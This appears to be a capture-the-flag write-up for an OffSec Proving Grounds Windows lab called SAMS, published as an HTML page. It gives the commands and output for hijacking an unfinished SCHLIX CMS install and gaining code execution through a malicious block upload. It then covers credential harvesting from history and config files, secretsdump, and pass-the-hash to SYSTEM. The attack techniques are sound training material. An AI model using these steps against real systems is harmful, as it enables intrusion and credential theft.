@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OffSec SAMS Walkthrough</title>
+    <style>
+        body { font-family: "Segoe UI", Arial, sans-serif; line-height: 1.6; background-color: #f4f4f9; color: #333; max-width: 1000px; margin: 0 auto; padding: 20px; }
+        .container { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 5px 25px rgba(0,0,0,0.1); }
+        h1 { text-align: center; color: #343a40; border-bottom: 4px solid #007bff; padding-bottom: 10px; margin-bottom: 30px; }
+        h2 { color: #007bff; margin-top: 30px; padding-bottom: 5px; border-bottom: 2px solid #eee; }
+        .section { margin-bottom: 40px; }
+        .tag { display: inline-block; padding: 4px 10px; border-radius: 4px; font-weight: bold; font-size: 0.85em; margin-bottom: 10px; color: white; }
+        .tag-success { background-color: #28a745; }
+        .tag-failure { background-color: #dc3545; }
+        .tag-info { background-color: #17a2b8; }
+        pre { background: #282a36; color: #f8f8f2; padding: 20px; border-radius: 8px; overflow-x: auto; font-family: "Consolas", monospace; position: relative; margin: 20px 0; cursor: pointer; }
+        pre .hint { position: absolute; top: 8px; right: 12px; font-size: 0.72em; color: #6b6f7d; user-select: none; }
+        pre.copied .hint { color: #9ec1a8; }
+        code { font-family: "Consolas", monospace; color: #e83e8c; background: #f8f9fa; padding: 2px 4px; border-radius: 4px; }
+        table { width: 100%; border-collapse: collapse; margin: 18px 0; }
+        th { background: #343a40; color: #fff; text-align: left; padding: 8px 10px; }
+        td { padding: 8px 10px; border-bottom: 1px solid #eee; vertical-align: top; }
+        ul { padding-left: 20px; }
+        li { margin-bottom: 8px; }
+        .flag { font-family: "Consolas", monospace; background: #f1f3f5; border: 1px solid #d9dde1; border-radius: 6px; padding: 10px 12px; margin: 10px 0; word-break: break-all; font-weight: bold; }
+        .footer { text-align: center; margin-top: 40px; color: #888; font-size: 0.9em; }
+        .footer a { color: #007bff; text-decoration: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>OffSec SAMS Walkthrough</h1>
+        <p style="text-align:left; margin-top:-15px; color:#555;"><strong>Type:</strong> Proving Grounds &middot; Windows 10 (build 19045)</p>
+
+        <div class="section">
+            <p>
+                SAMS hands you a SCHLIX CMS that was never finished installing, and that unfinished installer is the whole game.
+                The brief points at HiveNightmare for privilege escalation, but the box does not actually hold up its end of that
+                bargain, so root comes from an old config file someone forgot to delete. Initial access is a SCHLIX <code>2.2.6-6</code>
+                authenticated RCE; root is plain credential reuse. This writeup documents the verified path to both flags.
+            </p>
+        </div>
+
+        <div class="section">
+            <h2>1. Reconnaissance</h2>
+            <span class="tag tag-info">INFO</span>
+            <p>
+                A full scan shows an ordinary Windows web host. The site on 80/443 is a static template, but the real application
+                lives one directory deep and only answers over HTTPS.
+            </p>
+            <pre><span class="hint">copy</span><code>nmap -p- --min-rate 5000 192.168.x.x
+nmap -sC -sV -p 80,443,445,3306 192.168.x.x</code></pre>
+            <table>
+                <tr><th>Port</th><th>Service</th><th>Notes</th></tr>
+                <tr><td>80 / 443</td><td>Apache 2.4.48 / PHP 7.3.29</td><td>SCHLIX CMS under <code>/testing/</code>, HTTPS only</td></tr>
+                <tr><td>445</td><td>SMB</td><td>host <code>SAMS-PC</code>, signing disabled</td></tr>
+                <tr><td>3306</td><td>MariaDB</td><td>no remote logins allowed</td></tr>
+            </table>
+            <p>
+                The admin route <code>/testing/?r=admin/login</code> answers with SCHLIX's "no website configured at this address."
+                That is not an error you route around, it means the install was never completed.
+            </p>
+        </div>
+
+        <div class="section">
+            <h2>2. Finishing someone else's install</h2>
+            <span class="tag tag-success">SUCCESS</span>
+            <p>
+                The installer is still sitting at <code>/testing/install/</code> and it wants an external database. So you give it
+                one: your own MariaDB on the VPN interface, opened up just enough for the target's PHP to connect back. When the
+                wizard finishes, the admin account it creates is the one you chose.
+            </p>
+            <pre><span class="hint">copy</span><code>sudo sed -i 's/^bind-address.*/bind-address = 0.0.0.0/' /etc/mysql/mariadb.conf.d/50-server.cnf
+sudo systemctl restart mariadb
+sudo mysql -e "CREATE DATABASE schlixdb; CREATE USER 'schlix'@'%' IDENTIFIED BY 'sch******'; GRANT ALL ON *.* TO 'schlix'@'%' WITH GRANT OPTION;"</code></pre>
+            <p>
+                Walk the wizard, point the database step at your VPN IP, skip SSL, tick the wildcard URL option so the site serves
+                on the bare IP, and set the admin login to <code>admin</code> / <code>ad******</code>. The install writes its tables
+                straight into your database, which is convenient later.
+            </p>
+        </div>
+
+        <div class="section">
+            <h2>3. Authenticating, the annoying way</h2>
+            <span class="tag tag-info">INFO</span>
+            <p>
+                Two things waste time if you script this. SCHLIX renders the full admin chrome (menu, logout link, all of it) even
+                on a request that did not authenticate, so a page looking "logged in" proves nothing. The login only takes effect
+                with the AJAX headers, and it answers with JSON.
+            </p>
+            <pre><span class="hint">copy</span><code>curl -sk -b "$CK" -H 'X-Requested-With: XMLHttpRequest' -H 'X-Schlix-Ajax: 1' \
+  "$U/admin/userlogin/" -F "_csrftoken=$C1" -F 'username=admin' -F 'password=ad******'
+# {"status":200,"data":{"messages":["Login successful"]}}</code></pre>
+            <p>
+                The other trap: curl refuses to persist the session cookie because the server scopes it to <code>domain=&lt;IP&gt;</code>,
+                which the cookie spec disallows. Read the <code>Set-Cookie</code> from the response headers and pass it back by hand
+                instead of trusting the jar. The CSRF token for the upload is sitting in the session table, in the database you
+                control, so you can just read it out.
+            </p>
+        </div>
+
+        <div class="section">
+            <h2>4. RCE through the block manager</h2>
+            <span class="tag tag-success">SUCCESS</span>
+            <p>
+                SCHLIX <code>2.2.6-6</code> lets an authenticated admin install a block package, and the package's
+                <code>packageinfo.inc.php</code> gets included when you open the extension's About tab. That is the execution. The
+                only fiddly part is the archive layout: the installer derives the extension name from the first folder in the zip and
+                expects <code>name/blocks/name/</code> inside. Get that wrong and you get an unhelpful <code>max()</code> error
+                instead of a shell.
+            </p>
+            <pre><span class="hint">copy</span><code># malicious mailchimp block, payload appended to packageinfo.inc.php
+curl -sk -b "$CK" -H 'X-Requested-With: XMLHttpRequest' -H 'X-Schlix-Ajax: 1' \
+  "$U/admin/app/core.blockmanager?&ajax=1&action=install" \
+  -F "_csrftoken=$C2" -F 'zipfileupload=@combo_mailchimp-1_0_1.zip' \
+  -F 'MAX_FILE_SIZE=2097152' -F 'password=ad******'</code></pre>
+            <pre><span class="hint">copy</span><code>curl -sk -b "$CK" "$U/admin/app/core.blockmanager?action=edititem&id=1&tab=about&c=whoami"
+# sams-pc\sam</code></pre>
+            <p>One block row inserted into the database gives the About tab something to render, and the payload fires.</p>
+            <p><strong>Local flag</strong> (<code>sams-pc\sam</code>):</p>
+            <div class="flag">3fd5ad813a68fd7883d116abc6******</div>
+        </div>
+
+        <div class="section">
+            <h2>5. Hashes and SYSTEM</h2>
+            <span class="tag tag-success">SUCCESS</span>
+            <p>
+                The user's PowerShell history points straight at an old phpMyAdmin config, and the old config still holds the
+                password the current one had scrubbed. That database password is also the Administrator's password, it always is.
+            </p>
+            <pre><span class="hint">copy</span><code>type C:\Users\sam\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+type C:\xampp\phpMyAdmin\config.inc.old.php
+# password = 'Seriou******'
+
+nxc smb 192.168.x.x -u Administrator -p 'Seriou******'   # (Pwn3d!)</code></pre>
+            <p>
+                With admin you get the hive dump the lab was after anyway, just through the front door. Pass the hash closes it out.
+            </p>
+            <pre><span class="hint">copy</span><code>impacket-secretsdump 'Administrator:Seriou******@192.168.x.x'
+# Administrator: ... :0912e49206267ee2d62eb06cab******:::
+
+impacket-psexec -hashes ':0912e49206267ee2d62eb06cab******' 'Administrator@192.168.x.x'
+# nt authority\system</code></pre>
+            <p><strong>Proof flag</strong> (<code>NT AUTHORITY\SYSTEM</code>):</p>
+            <div class="flag">d3399dac14ce90d8ba64d50cd3******</div>
+        </div>
+
+        <div class="section">
+            <h2>6. Failed paths</h2>
+            <span class="tag tag-failure">DEAD END</span>
+            <p>
+                The box is named SAMS, the brief says HiveNightmare, the eventual password is <code>Seriou******</code>. Someone
+                wanted this to be about reading the SAM. It is not, not from this shell.
+            </p>
+            <ul>
+                <li><strong>No shadow copy:</strong> checked volumes 1 through 60, none exist. HiveNightmare reads the hives out of a VSS snapshot, and there isn't one. A standard user cannot create one.</li>
+                <li><strong>Live hive ACL:</strong> the SAM/SYSTEM/SECURITY files do not grant <code>sam</code> read, so the live file variant is out too.</li>
+                <li><strong>Defender and AMSI:</strong> Defender deletes the HiveNightmare binary on contact, and AMSI silently swallows the PowerShell version, its own special kind of debugging, where nothing happens and nothing tells you why.</li>
+            </ul>
+            <pre><span class="hint">copy</span><code>1..60 | %{ try { (New-Object IO.FileStream(
+ "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$_\Windows\System32\config\SAM",
+ [IO.FileMode]::Open,[IO.FileAccess]::Read,[IO.FileShare]'ReadWrite,Delete')).Close(); "HIT:$_" } catch {} }
+# (nothing)</code></pre>
+            <p>
+                The takeaway: when the documented privesc does not fit the snapshot you are on, the learning objective still gets met.
+                Admin credentials plus secretsdump plus pass the hash covers "hive dumping" and "pass the hash to SYSTEM" without a
+                single shadow copy. The history file usually knows more than the exploit does.
+            </p>
+        </div>
+
+        <p style="text-align:left; margin-top:40px; color:#555;">Hands above the blanket, and good luck out there. :)</p>
+
+        <div class="footer">
+            <p>OffSec SAMS Walkthrough | 2026.06.28 | <a href="https://github.com/Ogre444/OffSec-walkthroughs">by Ogrebogre</a></p>
+        </div>
+    </div>
+
+    <script>
+    document.querySelectorAll('pre').forEach(function(el){
+      el.addEventListener('click',function(){
+        var c=el.cloneNode(true); var h=c.querySelector('.hint'); if(h)h.remove();
+        navigator.clipboard.writeText(c.innerText.trim());
+        el.classList.add('copied');
+        var hint=el.querySelector('.hint'); if(hint)hint.textContent='copied';
+        setTimeout(function(){el.classList.remove('copied'); if(hint)hint.textContent='copy';},1400);
+      });
+    });
+    </script>
+</body>
+</html>
